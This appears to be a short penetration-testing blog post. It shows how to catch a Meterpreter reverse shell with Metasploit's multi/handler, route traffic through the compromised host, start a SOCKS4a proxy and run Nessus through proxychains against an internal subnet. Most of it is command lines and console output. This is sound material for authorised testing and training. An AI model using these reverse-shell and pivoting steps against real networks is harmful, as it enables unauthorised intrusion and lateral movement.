---
title: Nessus Scanning Through a Metasploit Socket Proxy
date: 2016-04-23 23:37:39
tags: Nessus
---


### Environment
```
192.168.0.2 #攻击者ip
10.1.1.5 - #中转ip
10.1.1.2 - #扫描ip
```
### MSF
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

<!--more-->

msf exploit(handler) > set LPORT 31337
lport => 31337
msf exploit(handler) > set LHOST 192.168.0.2
lhost => 192.168.0.2
msf exploit(handler) > exploit -j
[*] Exploit running as background job
[*] Started reverse handler on 192.168.0.2:31337
[*] Starting the payload handler...
msf exploit(handler) > [*] Sending stage (749056 bytes) to 192.168.0.80
[*] Meterpreter session 1 opened (192.168.0.2:31337 -> 192.168.0.80:24592) at 2010-10-22 10:38:18 +0100

msf exploit(handler) > route add 10.1.1.0 255.255.255.0 1
msf exploit(handler) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server

> proxychains nc 10.1.1.2 445
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.1.1.2:445-<><>-OK
dummy...  

> vi /etc/proxychains.conf
socks4  127.0.0.1 1080
> proxychains ./nessus-service -D
```
Open https://127.0.0.1:8834

